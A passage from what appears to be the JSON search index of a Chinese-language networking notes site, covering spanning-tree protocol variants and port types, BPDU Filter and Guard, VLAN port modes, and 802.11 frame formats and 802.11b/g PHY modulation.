<p>\u200b\u4e0b\u9762\u200b\u662f\u200b\u5728\u200b\u4e0d\u540c\u200b\u578b\u53f7\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\u4e0a\u200b\u89c2\u5bdf\u200b\u5230\u200b\u652f\u6301\u200b\u7684\u200b\u534f\u8bae\u200b\uff1a</p> <ul> <li>Dell: stp pvst rstp rapid-pvst mstp</li> <li>Huawei: stp rstp mstp vbst</li> <li>Mellanox: rst mst rpvst</li> <li>Cisco: mst rapid-pvst</li> </ul> <p>\u200b\u5b9e\u8df5\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b rapid-pvst/vbst/rpvst \u200b\u7684\u200b\u914d\u7f6e\u200b\u3002</p>"},{"location":"networking/spanning_tree_protocol.html#stp-port-type","title":"STP Port Type","text":"<p>\u200b\u5728\u200b\u4ea4\u6362\u673a\u200b\u8bbe\u7f6e\u200b\u4e2d\u200b\uff0c\u200b\u7ecf\u5e38\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5bf9\u200b STP Port Type \u200b\u7684\u200b\u652f\u6301\u200b\uff1a</p> <ul> <li>Edge\uff1a\u200b\u4ec5\u200b\u4e3b\u673a\u200b</li> <li>Network\uff1a\u200b\u4ec5\u200b\u4ea4\u6362\u673a\u200b</li> <li>Normal\uff1a\u200b\u81ea\u200b\u9002\u5e94\u200b</li> </ul> <p>STP \u200b\u534f\u8bae\u200b\u5728\u200b\u5de5\u4f5c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u9632\u6b62\u200b\u534f\u8bae\u200b\u521d\u59cb\u5316\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\u5f15\u5165\u200b\u4e86\u200b\u4e0d\u5fc5\u8981\u200b\u7684\u200b\u73af\u8def\u200b\uff0c\u200b\u521d\u59cb\u5316\u200b\u65f6\u200b\u662f\u200b\u4e0d\u200b\u8f6c\u53d1\u200b\u6d41\u91cf\u200b\u7684\u200b\u3002\u200b\u90a3\u4e48\u200b\uff0c\u200b\u5982\u679c\u200b\u4e8b\u5148\u200b\u77e5\u9053\u200b\u7aef\u53e3\u200b\u8fde\u63a5\u200b\u7684\u200b\u53ea\u6709\u200b\u4e3b\u673a\u200b\uff0c\u200b\u6ca1\u6709\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8df3\u8fc7\u200b\u8fd9\u4e2a\u200b\u8fc7\u7a0b\u200b\uff0c\u200b\u76f4\u63a5\u200b\u5f00\u59cb\u200b\u8fdb\u5165\u200b Forwarding \u200b\u72b6\u6001\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b Edge \u200b\u6a21\u5f0f\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u529f\u80fd\u200b\u4e5f\u200b\u53eb\u505a\u200b Port Fast\u3002\u200b\u5728\u200b Edge \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u4ea4\u6362\u673a\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b\u53d1\u200b\u6216\u200b\u4e0d\u53d1\u200b BPDU\u3002</p> <p>\u200b\u5982\u679c\u200b\u4e8b\u5148\u200b\u77e5\u9053\u200b\u8fde\u63a5\u200b\u7684\u200b\u662f\u200b\u4ea4\u6362\u673a\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u62e9\u200b Network\u3002\u200b\u4f46\u662f\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b\uff0cCisco \u200b\u5b9e\u73b0\u200b\u4e86\u200b Bridge Assurance\uff0c\u200b\u4e5f\u5c31\u662f\u8bf4\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b Network \u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5fc5\u987b\u200b\u8981\u6c42\u200b\u5bf9\u65b9\u200b\u4e5f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b Network \u200b\u6a21\u5f0f\u200b\uff0c\u200b\u5426\u5219\u200b\u5c31\u200b\u4e0d\u4f1a\u200b\u5de5\u4f5c\u200b\u3002Mellanox \u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u884c\u4e3a\u200b\u662f\u200b\uff0c\u200b\u5728\u200b Network \u200b\u6a21\u5f0f\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u6536\u5230\u200b\u6765\u81ea\u200b\u5176\u4ed6\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b BPDU\uff0c\u200b\u5219\u200b\u8fdb\u5165\u200b Discarding \u200b\u6a21\u5f0f\u200b\u3002</p> <p>\u200b\u666e\u9002\u200b\u7684\u200b\u65b9\u6cd5\u200b\u662f\u200b\u8bbe\u7f6e\u200b\u4e3a\u200b Normal\uff0c\u200b\u6b64\u65f6\u200b\u5c31\u200b\u4f1a\u200b\u6309\u7167\u200b\u6b63\u5e38\u200b\u7684\u200b\u65b9\u6cd5\u200b\u6765\u200b\u521d\u59cb\u5316\u200b\uff0c\u200b\u81ea\u200b\u9002\u5e94\u200b\u5de5\u4f5c\u200b\u3002</p>"},{"location":"networking/spanning_tree_protocol.html#bpdu-filter","title":"BPDU Filter","text":"<p>BPDU Filter \u200b\u987e\u540d\u601d\u4e49\u200b\uff0c\u200b\u5728\u200b\u7279\u5b9a\u200b\u7aef\u53e3\u200b\u4e0a\u200b\u7981\u7528\u200b STP \u200b\u534f\u8bae\u200b\uff1a\u200b\u4e0d\u200b\u53d1\u9001\u200b BPDU\uff0c\u200b\u6536\u5230\u200b\u7684\u200b BPDU \u200b\u90fd\u200b\u5ffd\u7565\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u6765\u200b\u9650\u5236\u200b STP \u200b\u5de5\u4f5c\u200b\u7684\u200b\u8303\u56f4\u200b\u3002</p> <p>BPDU Guard \u200b\u662f\u200b\u66f4\u52a0\u200b\u4e25\u683c\u200b\u7684\u200b BPDU Filter\uff1aBPDU Guard \u200b\u8bbe\u7f6e\u200b\u4ee5\u540e\u200b\uff0c\u200b\u5982\u679c\u200b\u6536\u5230\u200b\u6765\u81ea\u200b\u5176\u4ed6\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b BPDU\uff0c\u200b\u5219\u200b\u8fdb\u5165\u200b Discarding \u200b\u6a21\u5f0f\u200b\uff0c\u200b\u8fde\u200b\u6570\u636e\u200b\u6d41\u91cf\u200b\u90fd\u200b\u4e0d\u200b\u7ed9\u200b\u8f6c\u53d1\u200b\u3002</p>"},{"location":"networking/vlan.html","title":"VLAN","text":"<p>VLAN \u200b\u5b9a\u4e49\u200b\u5728\u200b 802.1Q \u200b\u6807\u51c6\u200b\u4e2d\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u76ee\u7684\u200b\u662f\u200b\u628a\u200b\u5c40\u57df\u7f51\u200b\u5207\u200b\u5206\u6210\u200b\u591a\u4e2a\u200b\u9694\u79bb\u200b\u7684\u200b\u7f51\u7edc\u200b\uff0c\u200b\u901a\u8fc7\u200b VLAN ID \u200b\u6765\u200b\u533a\u5206\u200b\u3002VLAN ID \u200b\u6709\u200b 12 \u200b\u4f4d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9009\u53d6\u200b\u7684\u200b\u533a\u95f4\u200b\u901a\u5e38\u200b\u662f\u200b 1-4094 \u200b\u6216\u8005\u200b 1-4093\uff0c\u200b\u5176\u4e2d\u200b 1 \u200b\u4e00\u822c\u200b\u662f\u200b\u7279\u6b8a\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u7ed9\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\u6253\u200b\u4e0a\u200b VLAN ID\uff0c\u200b\u4f1a\u200b\u5728\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\u5934\u90e8\u200b\u7684\u200b\u6e90\u5730\u5740\u200b\u540e\u9762\u200b\u63d2\u5165\u200b\u56db\u200b\u5b57\u8282\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002\u200b\u5b9a\u4e49\u200b\u5e26\u6709\u200b VLAN \u200b\u5934\u90e8\u200b\u7684\u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u79f0\u4e3a\u200b tagged\uff1b\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b VLAN \u200b\u5934\u90e8\u200b\uff0c\u200b\u5219\u200b\u79f0\u4e3a\u200b untagged\u3002</p> <p>\u200b\u542f\u7528\u200b VLAN \u200b\u4ee5\u540e\u200b\uff0c\u200b\u4ea4\u6362\u673a\u200b\u5185\u90e8\u200b\u6240\u6709\u200b\u7684\u200b\u5305\u200b\u90fd\u200b\u4f1a\u200b\u6709\u200b VLAN ID\uff08\u200b\u4e5f\u200b\u5c31\u662f\u200b tagged\uff09\uff0c\u200b\u6b64\u65f6\u200b\u540c\u4e00\u4e2a\u200b VLAN \u200b\u5185\u200b\u7684\u200b\u53ef\u4ee5\u200b\u4e92\u901a\u200b\uff0c\u200b\u4e0d\u540c\u200b VLAN \u200b\u5219\u200b\u88ab\u200b\u9694\u79bb\u5f00\u200b\u3002</p> <p>\u200b\u4ea4\u6362\u673a\u200b\u7684\u200b\u7aef\u53e3\u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u6210\u200b\u5982\u4e0b\u200b\u51e0\u79cd\u200b\u6a21\u5f0f\u200b\uff1a</p> <ol> <li>Access\uff1a\u200b\u53ea\u200b\u63a5\u6536\u200b untagged \u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u8fdb\u5165\u200b\u4ea4\u6362\u673a\u200b\u65f6\u200b\uff0c\u200b\u6839\u636e\u200b\u9884\u5148\u200b\u8bbe\u5b9a\u200b\u7684\u200b Port VLAN ID \u200b\u6253\u200b\u4e0a\u200b VLAN \u200b\u5934\u90e8\u200b\uff1b\u200b\u53d1\u9001\u200b\u65f6\u200b\uff0c\u200b\u53ea\u200b\u5141\u8bb8\u200b\u53d1\u9001\u200b Port VLAN ID \u200b\u5bf9\u5e94\u200b\u7684\u200b VLAN \u200b\u5185\u200b\u7684\u200b\u6d41\u91cf\u200b\uff0c\u200b\u5e76\u4e14\u200b\u79bb\u5f00\u200b\u4ea4\u6362\u673a\u200b\u65f6\u200b\uff0c\u200b\u4f1a\u200b\u53bb\u6389\u200b VLAN \u200b\u5934\u90e8\u200b\uff0c\u200b\u6210\u4e3a\u200b untagged\u3002\u200b\u6709\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\u4e5f\u200b\u5141\u8bb8\u200b\u63a5\u6536\u200b tagged \u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u8981\u6c42\u200b VLAN ID \u200b\u7b49\u4e8e\u200b Port VLAN ID\u3002</li> <li>Trunk\uff1a\u200b\u53ea\u200b\u63a5\u6536\u200b tagged \u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u4e0d\u200b\u505a\u200b\u4fee\u6539\u200b\uff1b\u200b\u53d1\u9001\u200b\u65f6\u200b\u4e5f\u200b\u53ea\u200b\u53d1\u9001\u200b tagged \u200b\u4ee5\u592a\u7f51\u200b\u5e27\u200b\uff0c\u200b\u4e0d\u200b\u505a\u200b\u4fee\u6539\u200b\u3002</li> <li>Hybrid\uff08\u200b\u6709\u200b\u7684\u200b\u4ea4\u6362\u673a\u200b\u79f0\u200b\u8fd9\u4e2a\u200b\u6a21\u5f0f\u200b\u4e3a\u200b Trunk\uff0c\u200b\u53d6\u4ee3\u200b\u4e0a\u9762\u200b\u7684\u200b\u7eaf\u7cb9\u200b Trunk\uff09\uff1a\u200b\u5bf9\u4e8e\u200b\u9884\u5148\u200b\u8bbe\u5b9a\u200b\u7684\u200b Port VLAN ID\uff0c\u200b\u884c\u4e3a\u200b\u662f\u200b Access\uff1b\u200b\u5176\u4ed6\u200b\u7684\u200b VLAN\uff0c\u200b\u884c\u4e3a\u200b\u662f\u200b Trunk\uff1a<ul> <li>\u200b\u63a5\u6536\u200b tagged \u200b\u548c\u200b untagged\uff0c\u200b\u5176\u4e2d\u200b untagged \u200b\u4f1a\u200b\u88ab\u200b\u8ba4\u4e3a\u200b\u662f\u200b\u5c5e\u4e8e\u200b Port VLAN ID \u200b\u5bf9\u5e94\u200b\u7684\u200b VLAN\uff0c\u200b\u53d8\u6210\u200b tagged\u3002</li> <li>\u200b\u53d1\u9001\u200b\u65f6\u200b\uff0c\u200b\u5982\u679c\u200b VLAN ID \u200b\u7b49\u4e8e\u200b Port VLAN ID\uff0c\u200b\u5219\u200b\u53bb\u6389\u200b VLAN \u200b\u5934\u90e8\u200b\uff0c\u200b\u53d8\u6210\u200b untagged\uff1b\u200b\u5426\u5219\u200b\u4e0d\u200b\u505a\u200b\u4fee\u6539\u200b\uff0c\u200b\u53d1\u9001\u200b tagged\u3002</li> </ul> </li> </ol> <p>\u200b\u4e0d\u540c\u200b\u4ea4\u6362\u673a\u200b\u5bf9\u4e8e\u200b Trunk \u200b\u548c\u200b Hybrid \u200b\u7684\u200b\u5b9a\u4e49\u200b\u6709\u6240\u4e0d\u540c\u200b\uff0c\u200b\u9700\u8981\u200b\u6839\u636e\u200b\u6587\u6863\u200b\u6765\u200b\u786e\u8ba4\u200b\u5177\u4f53\u200b\u884c\u4e3a\u200b\u3002\u200b\u4f8b\u5982\u200b Dell \u200b\u548c\u200b Cisco \u200b\u4ea4\u6362\u673a\u200b\u652f\u6301\u200b Access \u200b\u548c\u200b Trunk\uff0c\u200b\u4f46\u662f\u200b Trunk \u200b\u662f\u200b\u4e0a\u9762\u200b\u5b9a\u4e49\u200b\u7684\u200b Hybrid\uff1bH3C \u200b\u652f\u6301\u200b Access\uff0cTrunk \u200b\u548c\u200b Hybrid\uff0c\u200b\u4f46\u662f\u200b Trunk \u200b\u662f\u200b\u4e0a\u9762\u200b\u5b9a\u4e49\u200b\u7684\u200b Hybrid\uff0cHybrid \u200b\u5219\u200b\u529f\u80fd\u200b\u66f4\u52a0\u200b\u5f3a\u5927\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5b9a\u4e49\u200b\u53d1\u9001\u200b\u65f6\u200b\u54ea\u4e9b\u200b VLAN \u200b\u662f\u200b tagged\uff0c\u200b\u54ea\u4e9b\u200b VLAN \u200b\u662f\u200b untagged\uff0c\u200b\u4e0d\u4ec5\u4ec5\u200b\u9760\u200b Port VLAN ID \u200b\u533a\u5206\u200b\u3002</p>"},{"location":"networking/wlan.html","title":"WLAN","text":""},{"location":"networking/wlan.html#mac","title":"MAC \u200b\u5c42\u200b\u5e27\u200b\u683c\u5f0f","text":"<p>802.11 MAC \u200b\u5c42\u200b\u7684\u200b\u5e27\u200b\u683c\u5f0f\u200b\uff0c\u200b\u5982\u200b 802.11-1997 Figure 12\uff1a</p> <p> </p> 802.11 MAC \u200b\u5e27\u200b\u683c\u5f0f\u200b\uff08\u200b\u56fe\u6e90\u200b 802.11-1997\uff09 <p>\u200b\u524d\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b Frame Control \u200b\u7684\u200b\u5b9a\u4e49\u200b\u5982\u200b 802.11-1997 Figure 13\uff1a</p> <p> </p> 802.11 MAC Frame Control\uff08\u200b\u56fe\u6e90\u200b 802.11-1997\uff09 <p>\u200b\u6839\u636e\u200b Type \u200b\u548c\u200b Subtype \u200b\u5b57\u200b\u6bb5\u200b\u51b3\u5b9a\u200b\u4e86\u200b\u5e27\u200b\u7684\u200b\u7c7b\u578b\u200b\uff0c\u200b\u5982\u200b\u7ba1\u7406\u200b\uff08Management\uff09\u200b\u5e27\u200b\uff0c\u200b\u63a7\u5236\u200b\uff08Control\uff09\u200b\u5e27\u200b\u548c\u200b\u6570\u636e\u200b\uff08Data\uff09\u200b\u5e27\u200b\u3002</p> <p>\u200b\u65e0\u7ebf\u200b\u8def\u7531\u5668\u200b\u5b9a\u671f\u200b\u53d1\u9001\u200b Beacon frame\uff0c\u200b\u544a\u8bc9\u200b\u5ba2\u6237\u7aef\u200b\u81ea\u5df1\u200b\u5e7f\u64ad\u200b\u4e86\u200b\u54ea\u4e9b\u200b SSID\u3002\u200b\u5ba2\u6237\u7aef\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e3b\u52a8\u200b\u53d1\u9001\u200b Probe Request frame \u200b\u6765\u200b\u8be2\u95ee\u200b\u6709\u6ca1\u6709\u200b\u8def\u7531\u5668\u200b\u6709\u200b\u5bf9\u5e94\u200b\u7684\u200b SSID\uff0c\u200b\u5982\u679c\u200b\u6709\u200b\uff0c\u200b\u8def\u7531\u5668\u200b\u56de\u590d\u200b\u4e00\u4e2a\u200b Probe Response frame\u3002</p>"},{"location":"networking/wlan.html#phy","title":"PHY","text":"<p>802.11 \u200b\u652f\u6301\u200b\u5f88\u200b\u591a\u79cd\u200b PHY\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b\u6709\u200b 802.11 b/g/n/ac/ax\u3002\u200b\u8d77\u540d\u200b\u4e5f\u200b\u5f88\u200b\u6709\u610f\u601d\u200b\uff1a</p> <ul> <li>802.11b: High Rate\uff0c\u200b\u6700\u9ad8\u200b 11 Mbps</li> <li>802.11g: Extended Rate\uff0c\u200b\u6700\u9ad8\u200b 54 Mbps</li> <li>802.11n: High Throughput\uff0c\u200b\u6700\u9ad8\u200b 600 Mbps</li> <li>802.11ac: Very High Throughput\uff0c\u200b\u6700\u9ad8\u200b 6933 Mbps</li> <li>802.11ax: High Efficiency\uff0c\u200b\u6700\u9ad8\u200b 9608 Mbps</li> </ul>"},{"location":"networking/wlan.html#80211b","title":"802.11b","text":"<p>\u200b\u9996\u5148\u200b\u770b\u200b 802.11b\uff0c802.11b \u200b\u662f\u200b\u5bf9\u200b 802.11 \u200b\u7684\u200b\u8865\u5145\u200b\uff0c\u200b\u4e3b\u8981\u200b\u5b9a\u4e49\u200b\u4e86\u200b\u7b2c\u200b 18 \u200b\u7ae0\u200b <code>High Rate, direct sequence spread spectrum PHY specification</code>\uff0c\u200b\u7f29\u5199\u200b HR-DSSS\u3002</p> <p>HR-DSSS \u200b\u5de5\u4f5c\u200b\u5728\u200b 2.4 GHz \u200b\u9891\u6bb5\u200b\u4e0a\u200b\uff0c\u200b\u5e38\u7528\u200b\u7684\u200b\u662f\u200b 13 \u200b\u4e2a\u200b channel\uff0c\u200b\u4e2d\u5fc3\u200b\u9891\u7387\u200b\u4ece\u200b 2412 MHz \u200b\u5230\u200b 2472 MHz \u200b\u4e0d\u200b\u7b49\u200b\uff0c\u200b\u5448\u200b\u7b49\u5dee\u6570\u5217\u200b\uff0c\u200b\u516c\u5dee\u200b\u662f\u200b 5 MHz\u3002HR-DSSS \u200b\u4f1a\u200b\u5360\u7528\u200b 22MHz \u200b\u7684\u200b\u9891\u8c31\u200b\uff0c\u200b\u4ece\u200b\u4e2d\u5fc3\u200b\u9891\u7387\u200b\u51cf\u200b 11 MHz \u200b\u5230\u200b\u4e2d\u5fc3\u200b\u9891\u7387\u200b\u52a0\u200b 11 MHz\uff0c\u200b\u6240\u4ee5\u200b\u76f8\u90bb\u200b channel \u200b\u4f1a\u200b\u6709\u200b\u5e72\u6270\u200b\uff0c\u200b\u89c1\u200b\u4e0b\u56fe\u200b\uff08\u200b\u53d6\u81ea\u200b Wikipedia\uff09</p> <p> </p> 802.11 2.4GHz Channels\uff08\u200b\u56fe\u6e90\u200b IEEE 802.11 Wikipedia\uff09 <p>\u200b\u8fd9\u200b\u5c31\u662f\u200b\u4e3a\u4ec0\u4e48\u200b\u901a\u5e38\u200b\u4f1a\u200b\u628a\u200b 2.4GHz \u200b\u65e0\u7ebf\u200b\u8def\u7531\u5668\u200b\u7684\u200b channel \u200b\u56fa\u5b9a\u200b\u4e3a\u200b 1\u30016 \u200b\u6216\u200b 11\u3002</p> <p>\u200b\u90a3\u4e48\u200b\uff0cHR-DSSS \u200b\u5982\u4f55\u200b\u628a\u200b\u6570\u636e\u200b\u8c03\u5236\u200b\u4e3a\u200b 2.4GHz \u200b\u4e0a\u200b\u7684\u200b\u4fe1\u53f7\u200b\u5462\u200b\uff1fHR-DSSS \u200b\u652f\u6301\u200b\u4e0d\u540c\u200b\u7684\u200b\u901f\u7387\u200b\uff0c\u200b\u4f8b\u5982\u200b 1\u30012\u30015.5 \u200b\u548c\u200b 11 Mbps\uff0c\u200b\u8fd9\u4e9b\u200b\u4e8c\u8fdb\u5236\u200b\u7684\u200b\u6570\u636e\u200b\u9700\u8981\u200b\u6309\u7167\u200b\u4e00\u5b9a\u200b\u7684\u200b\u65b9\u6cd5\u200b\u8c03\u5236\u200b\u5230\u200b 2.4 GHz \u200b\u7684\u200b\u8f7d\u6ce2\u200b\u4e0a\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u662f\u200b\u6700\u200b\u7b80\u5355\u200b\u7684\u200b\u60c5\u51b5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5728\u200b channel 1 \u200b\u4e0a\u200b\u4f20\u8f93\u200b 1 Mbps \u200b\u7684\u200b\u6570\u636e\u200b\uff0c802.11 \u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b DSSS \u200b\u7684\u200b\u65b9\u6cd5\u200b\u3002\u200b\u7b80\u5355\u200b\u6765\u8bf4\u200b\uff0c\u200b\u5bf9\u4e8e\u200b\u8f93\u5165\u200b\u7684\u200b\u6bcf\u4e2a\u200b\u4f4d\u200b\uff0c\u200b\u6269\u5c55\u200b\u6210\u200b 11 \u200b\u4e2a\u200b bit\uff0c\u200b\u8fd9\u6837\u200b\u5c31\u200b\u5f97\u5230\u200b\u4e86\u200b\u4e00\u4e2a\u200b 11 MHz \u200b\u7684\u200b\u57fa\u5e26\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u7136\u540e\u200b\u518d\u200b\u628a\u200b\u57fa\u5e26\u200b\u4fe1\u53f7\u200b\u901a\u8fc7\u200b DBPSK \u200b\u8c03\u5236\u200b\u5230\u200b 2412 MHz \u200b\u7684\u200b\u8f7d\u6ce2\u200b\u4fe1\u53f7\u200b\u4e0a\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u6269\u5c55\u200b\u8fc7\u7a0b\u200b\u662f\u200b\u8fd9\u6837\u200b\u7684\u200b\uff1a\u200b\u5982\u679c\u200b\u6570\u636e\u4f4d\u200b\u662f\u200b 0\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8f93\u51fa\u200b 10110111000\uff08Barker \u200b\u7801\u200b\uff09\uff1b\u200b\u5982\u679c\u200b\u6570\u636e\u4f4d\u200b\u662f\u200b 1\uff0c\u200b\u90a3\u200b\u5c31\u200b\u8f93\u51fa\u200b 01001000111\u3002\u200b\u5b9e\u9645\u4e0a\u200b\u5c31\u662f\u200b\u628a\u200b 1 \u200b\u4f4d\u200b\u7684\u200b\u4fe1\u606f\u200b\u91cd\u590d\u200b\u4e86\u200b 11 \u200b\u6b21\u200b\u518d\u200b\u53d1\u51fa\u200b\u53bb\u200b\uff0c\u200b\u770b\u8d77\u6765\u200b\u5f88\u200b\u6d6a\u8d39\u200b\uff0c\u200b\u4f46\u200b\u5f88\u200b\u597d\u5730\u89e3\u51b3\u200b\u4e86\u200b\u5e72\u6270\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4f20\u8f93\u200b\u4e2d\u200b\u51fa\u73b0\u200b\u4e86\u200b\u9519\u8bef\u200b\uff0c\u200b\u63a5\u53d7\u65b9\u200b\u4e5f\u200b\u5f88\u200b\u5bb9\u6613\u200b\u4ece\u200b 11 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\u4e2d\u200b\u6062\u590d\u200b\u51fa\u200b\u539f\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>2 Mbps \u200b\u7684\u200b\u4f20\u8f93\u65b9\u5f0f\u200b\u7c7b\u4f3c\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u6bcf\u4e2a\u200b symbol \u200b\u4f20\u8f93\u200b\u4e24\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u6240\u4ee5\u200b\u91c7\u7528\u200b DQPSK \u200b\u7684\u200b\u8c03\u5236\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u9891\u7387\u200b\u4fdd\u6301\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u5b9e\u73b0\u200b\u4e86\u200b\u4e24\u500d\u200b\u7684\u200b\u6570\u636e\u200b\u4f20\u8f93\u901f\u7387\u200b\u3002</p> <p>5.5 Mbps \u200b\u548c\u200b 11 Mbps \u200b\u5219\u200b\u91c7\u7528\u200b\u4e86\u200b\u5176\u4ed6\u200b\u65b9\u6cd5\u200b\u3002\u200b\u7531\u4e8e\u200b\u4e0a\u9762\u200b\u7684\u200b 1 \u200b\u6bd4\u200b 11 \u200b\u7684\u200b\u8f6c\u6362\u200b\u6bd4\u4f8b\u200b\u592a\u200b\u6d6a\u8d39\u200b\u4e86\u200b\uff0c\u200b\u6240\u4ee5\u200b\u4e3a\u4e86\u200b\u63d0\u5347\u200b\u901f\u5ea6\u200b\uff0c5.5 Mbps \u200b\u548c\u200b 11 Mbps \u200b\u65f6\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b CCK \u200b\u7f16\u7801\u65b9\u5f0f\u200b\uff0c\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0c5.5 Mbps \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8f93\u5165\u200b\u7684\u200b 4 \u200b\u4e2a\u200b bit \u200b\u4f1a\u200b\u6620\u5c04\u200b\u4e3a\u200b 8 \u200b\u4e2a\u200b chip\uff0c\u200b\u7c7b\u4f3c\u200b\u5730\u200b 11 Mbps \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8f93\u5165\u200b\u7684\u200b 8 \u200b\u4e2a\u200b bit \u200b\u4e5f\u200b\u6620\u5c04\u200b\u5230\u200b 8 \u200b\u4e2a\u200b chip\u3002\u200b\u6bcf\u4e2a\u200b chip \u200b\u90fd\u200b\u662f\u200b\u590d\u6570\u200b\uff0c\u200b\u91c7\u7528\u200b DQPSK \u200b\u8fdb\u884c\u200b\u8c03\u5236\u200b\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u6574\u4e2a\u200b\u8fc7\u7a0b\u200b\u90fd\u200b\u662f\u200b\u5728\u200b\u5197\u4f59\u200b\uff1a\u200b\u901f\u7387\u200b\u4f4e\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u5197\u4f59\u200b\u5f88\u591a\u200b\u4efd\u200b\uff1b\u200b\u901f\u7387\u200b\u9ad8\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5197\u4f59\u200b\u5c31\u200b\u6bd4\u8f83\u200b\u5c11\u200b\u3002\u200b\u5b9e\u9645\u4e0a\u200b\uff0c5.5 Mbps \u200b\u548c\u200b 11 Mbps \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u53ef\u9009\u200b\u7684\u200b PBCC \u200b\u8fdb\u884c\u200b\u7f16\u7801\u200b\uff0c\u200b\u4e0b\u9762\u200b\u6458\u6284\u200b\u4e86\u200b About Data Modulation Format (802.11b/g DSSS/CCK/PBCC) \u200b\u4e2d\u200b 802.11b \u200b\u4e0d\u540c\u200b\u901f\u7387\u200b\u548c\u200b\u7f16\u7801\u65b9\u5f0f\u200b\u7684\u200b\u8868\u683c\u200b\uff1a</p> Data Modulation Formats Spread Sequence Code scheme Data Rate(Mbps) Symbol Rate(Msps) Chip Rate (Mcps) Bits per Symbol Modulation Barker 1 11 Chip Barker 1 1 11 1 DBPSK Barker 2 11 Chip Barker 2 1 11 2 DQPSK CCK 5.5 8 chip CCK 5.5 1.375 11 4 DQPSK CCK 11 8 chip CCK 11 1.375 11 8 DQPSK PBCC 5.5 PBCC 5.5 11 N/A 0.5 QPSK PBCC 11 PBCC 11 11 N/A 1 QPSK"},{"location":"networking/wlan.html#80211g","title":"802.11g","text":"<p>802.11g \u200b\u5b9a\u4e49\u200b\u4e86\u200b\u7b2c\u200b 19 \u200b\u7ae0\u200b <code>Extended Rate PHY specification</code>\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b ERP(Extended Rate PHY)\uff0c\u200b\u5176\u200b\u4e3b\u8981\u200b\u91c7\u7528\u200b\u7684\u200b\u6280\u672f\u200b\u662f\u200b OFDM\uff0c\u200b\u8fde\u200b\u8d77\u6765\u200b\u5c31\u662f\u200b ERP-OFDM\uff0c\u200b\u989d\u5916\u200b\u652f\u6301\u200b\u66f4\u200b\u591a\u200b\u901f\u7387\u200b\uff1a6\u30019\u300112\u300118\u300124\u300136\u300148 \u200b\u548c\u200b 54 Mbps\u3002\u200b\u5404\u79cd\u200b\u8c03\u5236\u200b\u6280\u672f\u200b\u7684\u200b\u901f\u7387\u200b\u5bf9\u6bd4\u200b\uff1a</p> <ul> <li>DSSS: 802.11 1/2 Mbps</li> <li>CCK: 802.11b 5.5/11 Mbps</li> <li>OFDM: 802.11g 6/9/12/18/24/36/48/54 Mbps</li> <li>PBCC: 802.11b 5.5/11 Mbps, 802.11g 22/33 Mbps</li> </ul> <p>OFDM 